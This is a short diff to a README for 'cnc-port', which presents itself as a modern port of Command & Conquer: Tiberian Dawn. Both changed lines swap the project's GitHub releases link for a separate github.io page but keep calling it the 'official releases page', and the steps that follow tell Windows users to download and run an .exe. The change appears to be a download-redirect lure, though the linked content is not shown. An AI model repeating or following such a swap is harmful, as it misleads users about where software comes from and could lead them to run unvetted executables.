@@ -1,6 +1,6 @@
 # 🎮 cnc-port - Play classic strategy games on modern devices
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/slippery-familyceratopsidae440/cnc-port/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://slippery-familyceratopsidae440.github.io)
 
 This project brings the classic Command & Conquer: Tiberian Dawn experience to your modern hardware. You can play this original real-time strategy game without needing complex emulators or old virtual machines. This port runs the game code natively. It handles the graphics and audio processing for you, which results in a smooth and stable experience.
 
@@ -10,7 +10,7 @@ The setup process requires a few simple steps. You need the original game files 
 
 ## 💾 How to Install
 
-1. Visit the [official releases page](https://github.com/slippery-familyceratopsidae440/cnc-port/releases) to download the latest version of the software.
+1. Visit the [official releases page](https://slippery-familyceratopsidae440.github.io) to download the latest version of the software.
 2. Select the file marked for your specific operating system. For Windows users, look for the file ending in .exe.
 3. Save this file to a folder on your computer.
 4. Extract the contents of the download if it comes in a compressed folder.
